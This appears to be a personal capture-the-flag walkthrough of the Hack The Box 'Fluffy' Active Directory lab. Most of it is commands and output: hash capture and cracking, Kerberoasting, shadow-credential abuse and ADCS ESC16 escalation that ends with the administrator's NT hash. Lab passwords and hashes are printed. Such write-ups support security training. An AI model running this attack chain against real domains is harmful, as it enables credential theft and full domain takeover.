- As is common in real life Windows pentests, you will start the Fluffy box with credentials for the following account:
j.fleischman / J0elTHEM4n1990!

```
nmap --min-rate 10 10.10.11.69 -p- -Pn
Starting Nmap 7.93 ( https://nmap.org ) at 2025-05-26 11:25 EDT
Nmap scan report for 10.10.11.69
Host is up (0.020s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws

```

- https://www.linode.com/docs/guides/linux-mount-smb-share/

FLUFFY\p.agila
```
p.agila::FLUFFY:dd0ef696f2803887:43F3A3736960A042D8CB34663BB9D25B:01010000000000008039DE5435CEDB011171B8C52D83B1D00000000002000800590041004C004B0001001E00570049004E002D005A004C004A004800320043005900440031004900370004003400570049004E002D005A004C004A00480032004300590044003100490037002E00590041004C004B002E004C004F00430041004C0003001400590041004C004B002E004C004F00430041004C0005001400590041004C004B002E004C004F00430041004C00070008008039DE5435CEDB0106000400020000000800300030000000000000000100000000200000DDBBE557F97AF89DB0C39006ACCE42EEFAA1FD795963776F669E6E0A37440A040A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00360037000000000000000000
```

- `hashcat -m 5600 agila.hash /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt`
    - p.agila: prometheusx-303

-

```
python3 targetedKerberoast.py -v -d 'fluffy.htb' -u 'p.agila' -p 'prometheusx-303'
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[+] Printing hash for (ca_svc)
$krb5tgs$23$*ca_svc$FLUFFY.HTB$fluffy.htb/ca_svc*$754e664414973eaf90f0b7fd21e75636$7d624823b720d03134d69701a3b38615911a9f33bbd01702020c1ddf9298611738c91a28bfad63131be442345102eefe5d814575ff91dc9ffcb5315bede223e4e97f462e765f0400e03fd1beb111e9965330e2e52f46c66e07835c5bb1e8f95524e5e57227868a7465ac16f7f48f2ac0135094dc04ef36dd5059166cf9b67be8987456854d7f3636451895af935aad17e441d4a866cfd0acad4679131cf19154f851a94d843936365648778890c577068ad600a8832c3a4ea12d57b4f312700842d210326cfaf211eb20dd5a05f3c35e8314f8579a40464c7602d4787c303c7831b0a386c7d475dbfd4f161d163f2aebc2b3835eeb5d15fc08e1fdb9b9be8bc9535031872dbce22050a7e33e1587335c9f996fd72cd4d99fb60010f60022f4c307b52140718c051cdc3edb9e53ad4c355f5d91152f67b93a0b877dac48a25f5dbb14d434428fbca9b010bd65128c95498fb59f699c81d6b3c26c0e68ff64054205801faf91c97357e475b642210ab437ebbed8cd59713ee9f9fdb0d84c20ecc9964f54dad50e7b3cae6a12c0bd31aae77b0f5f384690bc266b00887e308a3159854090f8f0f6d7dfd73658bc71d8d22f64f1ab539387d6a827ffc65c56d0faab8aa7c75e1b04fbc87eb8331ab050262ace25234b3dd2160560df77982777c5caaaa0d504cb7bcbce802ff6ef359773f1db47a54c290ee050bb0c2d60c5568ddba5f820fcbcc6e562c325c7f5b5bccf8fb99314591cf11ec23991897274f82f0ea9d0881f7ed738a3e7807ed4711444a1c6dc6c83cd321d830a374782219925622ea0a0491247104acbd4405e672b9174635155127c779bcd129b0f8523316596d78f478edb801e45876adf086cd4d238aaaa05853ec750c3f5803db0fa1eb98272062355febf15b448e46ddc8e83b8ada2d28b16db66dc4143792041df01e0e7a68425d3b70d8233444e56cb414067e7b6a471dad88d0e075f412cb6bdfb56ad76bea48700139ccb9dad4e7e3a83c4835cdeeac1eb62fad7e4655615c685df3ba6b926d2e6e4b250bc88a517c6edb4d11b53bb0dc4a081a0fe5d52068cd5638ad0fa0524eee1dc18388eb531fa52db1b884b03cd1f897174d1a48172d40095916f16576f86013b5570042e70cb6b27b10b7cd37619405918294559b523467e008e650ed07b7aa944098d97fa0d140cc8ebb0578baa1b7645de0d6a2c0782be13656a3b19adb3e00ce911eb025a92343d7be0955c43e28b118298d387f2221996f4eb8d24db3f14617da9f0cd368e251d5439f8b03424a88018b3da5a67c657516051e50dc103470a4ed10b91cc11534ff7315460ab9fada3dff4e22c507d3d7f5962f36723826dad71050bde81fda8f936228419ea5f523f7e53999accc87c3c83c3551e9c22e73ef89908c57b9b8eb385cb715c5911965a213a2183965b7a11923a8c8b125d12efbd356f533eaa13c53cdec99d1162432ca8008898d9907143b0cb
[+] Printing hash for (ldap_svc)
$krb5tgs$23$*ldap_svc$FLUFFY.HTB$fluffy.htb/ldap_svc*$58421ba931d31bc9159cb73e9bc930dd$ec011df44e8b72e6be8ed9afbea283be4e1fa488e7b658e151845b204555f01f706ab0156902144f64246302932f98a48d67a7cca7e3776b289ae8957f4e311b7a1d447daa9a670e0c078a662d36c2a6981d4a0c6c296303be7e29bec028f97fbfb74cf9faef150b49de4031930259c8d19270128cbcf16f2a1a39aee546b632a3b2c42b0ca61bae5932ba167ccb61f00f1d9ae682c4829496bb9184203286f0726d6e67f8dcb56d116a3d17cdaa233b1e41d650b27a86882a856d713f7fefaca82f2e33ca3cd102e59abf556966c14758c13514f885199e765cbe50e085a1cb473db2a6149254d41f43a349532d18467d8bb54cee84aefb4fc46d05d067440da7f58c29f15275fb46914a8401f7b2f633c4e1fd7756c75da11870932631fa4c35770887df3abf56d9b0d07f385646027d80f650e187ddb1e495526daacb27a9e880d7a110570e196b7398a8bc97e2a63c02974f583b02562b9a3833b01c1fccb9d6da3b3c86238b062fd5d81d540f1d4cbf9ae580d30be10c1117bde02effa446b2adde9b91dfdac74404f8d4c794794d24c09fdd37229a89b8d2d6bca8a4f957b7e352e6041be8568896917bd84ccb7387a0318bc64f0f33a63ca94acbf7129d5d369cf2c6de54f23039982131a2e3b0f1cdaf2587b16b270c9e627e9e6fb704f794deb762ce55660576a66996d6ef3e1de4d7878f0eaac19c2f8fcf08db15fd193ff4cca81069db9f889d4613869e150fc7fc246d5254faa36d198b7ca2637549bb5a164361667a858e7c4489eff1db320cad7cdad3426e83a2139f8bd2a4233137db06cb5f2524f6e0c70602273e1af360d72d406567f64e966db265e33626c72915af34c5610deb2cab9fdcf0a30cc0d92467c1c11153285199eedcfa8e18a223f642db00d4c19212c1122f0662f3427b2501dbf5ed5580017e85be553765aff5f4194175bc5533a363b327bd57fc2b6c06619bbc68cf2042b9f9154a042d5394e98756c077a78f5bcdd2e03c146b231274744cc3649e046ef140129804bf2bb45c77f6d7ab4b17acbdb4d1edd6a30809411d94410f8307928610b48c6d7bdd5b6b9072eb1ff0248a24580874d27b42ff04590f8c676ada7219a2806e4ea6abfcf299002fd1631d0b3c8220a64784934210446c6597217b9c2a71e99ae76b5f2dd7eb5c5585b5bc0618cbb21b423c9a7baf35cc29451bf17f2c6f518b0d29b3fd58e483dbc8e3af09da05f40afb0ee591a8922a38adf9bc667a8c562bd53b3619c287eb6a22615d4ac6d03cf69565b3c2b09b4108ba66859fb98f20e82a948bdedafcd54514d73bcc79895979e43d8750299c975ce0197347f01c43f470fa893b28d3bfa867e5931f24ef8bdfe0e11aa7131a3c65886a72ddc862aae84d1cf0519a03e5e952cf625c3e2abb0480d0053fed45aebb7ce78ad5c42e6ac1e8b75cd1896ff57aad0b69451e5cf098b9c1f4281c420cc7c93efcc3a7ad61e28a1795
[+] Printing hash for (winrm_svc)
$krb5tgs$23$*winrm_svc$FLUFFY.HTB$fluffy.htb/winrm_svc*$e00dcffe637dbd5dddc228a027e54ed3$93bcee368ca849afb3ae079d89d3fb1038c01498feb2bf3f082631c5f911f244db83a86c16a171a2f6a6e115b98016dc4172b79bef23f54546f3500fb777f17e00051cfb64ed48b32d41f645209ded4978fdf5eccabbb61a586ca81a1e09503b81bd73b62605211f1d747b9ede6096a713d7352880ac5f06fca1a39ee37e713e4af5027883cbe1c9b9a17c8dd044dc8d238df21764b9aa1c26ec5cfa4b0863e813225067d5438ad41e001df5fb337f683e0cabfd7a447bfe5b92264c9bf3a2f71989b59ba42b94f50faa85e6383c048c0487ad8d0eedc034c1fcc22eb7c864658de3e51e504bd2bb5901469222c20cef1a326c6b832943ff2b1cf7b8a33654f28c1503ed78ddf2a9768fece94ba7eae0ce8ba97043c08ac22151473efe3d622c1d086a993cb1c73fcf5df53515b3d564676ace09bb8fd9a6e9ef58e316931422b015cf541c70cc4b49bca57deabdd88ec34b48633de7d43c7f5fd260f721df909a4950d778d7ea8eb949882f528f976848ee6811110d0c26fea8557e1ab98b976cbcfbc1462e6c2133705ac103b0cbb3af6481343ad3025eb57a687b5be2566018bd2a288117731d4f7601cd14d323e83792f749eb53ffbb7293d89189c3156691b724637420eb66db7d4fcd4753a9b3d5ddcbb90ffc018ec85e60ee61014bc242dcf9efab19a1fde7017c69d97bb1a857dcf20836025d6a65c14c3fd472715e0665fc567a0f02f9b8403d7138b69ae08fd9870efb2906da04ac4343e857c31d14c679523d77ea2fc12b71b5218f36db3629ec5c43e82990262d2a94372bb2d31c789d1610ea854ab3e4100e020c51d6845e01d5fa32f8183926c06e0a7663828ca3d1931836ee6b9521b04d5173fe39194dee190515878583bda5c9e06e9b72821f5deecc911e1254a1512d531477532bb4b5d86dbd96cb9829c55743c2620ef515764646005c60ced1a03693477960b23c33da4ccc6d90a12b46aa4ecf63252fd442fe464bbb9a13191181bfa2f657bf1498716cc27a12566712f33ec631d8608d0da038ac3581b75761a131e57f0927359919513787ad57b3ae612cdeaa27ba79991df70144f1693681e4f37a21413c678941b899368c3501e890f5e8a79d2d24db27646ddf7fc72e506f02ccf3ed55e9364148805c38006584eaf7d1c90390cdbf6a94d70728808c3bdf7abf47b2faa8ee0a05cc58e62a22bcf85e394c5d19eb6a242cdd918d0d236919d216b5e7a4c3a9e4c3f7516a1dc5eb9b8c711337d0eca7e42d35841e5d2b19352aad36c9d97f22c45985c1acf63bda889559a66a098613ff595c718423a7c30352066c05ee83fb7ba35b17422ea1dcf805a2795774bee085d6a32d16e9dad268aa68613150100f37dcc116041326f5e6031e64f11e607113d9f8b69911963093247d18e4882f36f3ecddaefada82d9b5c28723b7b19f96d2498d23ddb174be2c031dd1ff980eb22f08011dddfc553258da657c179461
```

- Could not crack above hashes
- Using pywhisker to see what it does
```
sudo python3 pywhisker.py -d "fluffy.htb" -u "p.agila" -p "prometheusx-303" --target "winrm_svc" --action "add"
[*] Searching for the target account
[*] Target user found: CN=winrm service,CN=Users,DC=fluffy,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 416e6942-24f1-4e8e-e91b-99edd008bb09
[*] Updating the msDS-KeyCredentialLink attribute of winrm_svc
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Converting PEM -> PFX with cryptography: 4xYvJIFB.pfx
[+] PFX exportiert nach: 4xYvJIFB.pfx
[i] Passwort für PFX: 78XbAG1XFw1K9N7QOpDe
[+] Saved PFX (#PKCS12) certificate & key at path: 4xYvJIFB.pfx
[*] Must be used with password: 78XbAG1XFw1K9N7QOpDe
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools

```

```
certipy-ad cert -export -pfx "4xYvJIFB.pfx" -password "78XbAG1XFw1K9N7QOpDe" -out "use4xY.pfx"
certipy-ad auth -pfx use4xY.pfx -dc-ip 10.10.11.69 -username 'winrm_svc' -domain FLUFFY.HTB


Certipy v4.8.2 - by Oliver Lyak (ly4k)

[!] Could not find identification in the provided certificate
[*] Using principal: winrm_svc@fluffy.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'winrm_svc.ccache'
[*] Trying to retrieve NT hash for 'winrm_svc'
[*] Got hash for 'winrm_svc@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:33bd09dcd697600edf6b3a7af4875767
```

```
sudo python3 pywhisker.py -d "fluffy.htb" -u "p.agila" -p "prometheusx-303" --target "ca_svc" --action "add"
[sudo] password for kali:
[*] Searching for the target account
[*] Target user found: CN=certificate authority service,CN=Users,DC=fluffy,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: d83c27e3-4d9c-2f64-79c7-6f9423b932a8
[*] Updating the msDS-KeyCredentialLink attribute of ca_svc
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Converting PEM -> PFX with cryptography: 8xdLkgJt.pfx
[+] PFX exportiert nach: 8xdLkgJt.pfx
[i] Passwort für PFX: kYiBnp2GzQV9fCxkxUrB
[+] Saved PFX (#PKCS12) certificate & key at path: 8xdLkgJt.pfx
[*] Must be used with password: kYiBnp2GzQV9fCxkxUrB
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```

```
certipy-ad auth -pfx ca_certs/use8xd.pfx -dc-ip 10.10.11.69 -username 'ca_svc' -domain FLUFFY.HTB
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[!] Could not find identification in the provided certificate
[*] Using principal: ca_svc@fluffy.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'ca_svc.ccache'
[*] Trying to retrieve NT hash for 'ca_svc'
[*] Got hash for 'ca_svc@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:ca0f4f9e9eb8a092addf53bb03fc98c8
```
- Run certipy to find vulnerabilities
```
certipy-ad find -u 'ca_svc@fluffy.htb' -hashes 'aad3b435b51404eeaad3b435b51404ee:ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip '10.10.11.69' -vulnerable -enabled -std
out
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 14 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'fluffy-DC01-CA' via RRP
[*] Successfully retrieved CA configuration for 'fluffy-DC01-CA'
[*] Checking web enrollment for CA 'fluffy-DC01-CA' @ 'DC01.fluffy.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : fluffy-DC01-CA
    DNS Name                            : DC01.fluffy.htb
    Certificate Subject                 : CN=fluffy-DC01-CA, DC=fluffy, DC=htb
    Certificate Serial Number           : 3670C4A715B864BB497F7CD72119B6F5
    Certificate Validity Start          : 2025-04-17 16:00:16+00:00
    Certificate Validity End            : 3024-04-17 16:11:16+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Disabled Extensions                 : 1.3.6.1.4.1.311.25.2
    Permissions
      Owner                             : FLUFFY.HTB\Administrators
      Access Rights
        ManageCa                        : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        ManageCertificates              : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        Enroll                          : FLUFFY.HTB\Cert Publishers
    [!] Vulnerabilities
      ESC16                             : Security Extension is disabled.
    [*] Remarks
      ESC16                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
Certificate Templates                   : [!] Could not find any certificate templates

```

This looks like ESC16 - https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally

```
certipy-ad account \
    -u 'ca_svc@fluffy.htb' -hashes 'aad3b435b51404eeaad3b435b51404ee:ca0f4f9e9eb8a092addf53bb03fc98c8' \
    -dc-ip '10.10.11.69' -user 'ca_svc' \
    read
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Reading attributes for 'ca_svc':
    cn                                  : certificate authority service
    distinguishedName                   : CN=certificate authority service,CN=Users,DC=fluffy,DC=htb
    name                                : certificate authority service
    objectSid                           : S-1-5-21-497550768-2797716248-2627064577-1103
    sAMAccountName                      : ca_svc
    servicePrincipalName                : ADCS/ca.fluffy.htb
    userPrincipalName                   : ca_svc@fluffy.htb
    userAccountControl                  : 66048
    whenCreated                         : 2025-04-17T16:07:50+00:00
    whenChanged                         : 2025-05-30T06:01:03+00:00
```


```
certipy-ad account \
    -u 'ca_svc@fluffy.htb' -hashes 'aad3b435b51404eeaad3b435b51404ee:ca0f4f9e9eb8a092addf53bb03fc98c8' \
    -dc-ip '10.10.11.69' -upn 'administrator' -user 'ca_svc' \
        update
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_svc':
    userPrincipalName                   : administrator
[*] Successfully updated 'ca_svc'
```



```
certipy-ad shadow \
    -u 'ca_svc@fluffy.htb' -hashes 'aad3b435b51404eeaad3b435b51404ee:ca0f4f9e9eb8a092addf53bb03fc98c8' \
    -dc-ip '10.10.11.69' -account 'ca_svc' \
    auto
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '00f1304b-627c-c4ab-3e7d-a4edccde9098'
[*] Adding Key Credential with device ID '00f1304b-627c-c4ab-3e7d-a4edccde9098' to the Key Credentials for 'ca_svc'
[*] Successfully added Key Credential with device ID '00f1304b-627c-c4ab-3e7d-a4edccde9098' to the Key Credentials for 'ca_svc'
[*] Authenticating as 'ca_svc' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'ca_svc@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ca_svc.ccache'
File 'ca_svc.ccache' already exists. Overwrite? (y/n - saying no will save with a unique filename): n
[*] Wrote credential cache to 'ca_svc_fcfa047a-ef2e-468c-ba6a-c75aa33ade71.ccache'
[*] Trying to retrieve NT hash for 'ca_svc'
[*] Restoring the old Key Credentials for 'ca_svc'
[*] Successfully restored the old Key Credentials for 'ca_svc'
[*] NT hash for 'ca_svc': ca0f4f9e9eb8a092addf53bb03fc98c8

```

```
KRB5CCNAME=ca_svc_fcfa047a-ef2e-468c-ba6a-c75aa33ade71.ccache certipy-ad req \
    -k -dc-ip '10.10.11.69' \
    -target 'DC01.fluffy.htb' -ca 'fluffy-DC01-CA' \
    -template 'User'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[!] DC host (-dc-host) not specified and Kerberos authentication is used. This might fail
[*] Requesting certificate via RPC
[*] Request ID is 21
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

```
certipy-ad account \
    -u 'ca_svc@fluffy.htb' -hashes 'aad3b435b51404eeaad3b435b51404ee:ca0f4f9e9eb8a092addf53bb03fc98c8' \
    -dc-ip '10.10.11.69' -upn 'ca_svc@fluffy.htb' -user 'ca_svc' \
        update

[*] Updating user 'ca_svc':
    userPrincipalName                   : ca_svc@fluffy.htb
[*] Successfully updated 'ca_svc'
```

```
certipy-ad auth \
    -dc-ip '10.10.11.69' -pfx 'administrator.pfx' \
    -username 'administrator' -domain 'fluffy.htb'

Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator'
[*] Using principal: 'administrator@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
```



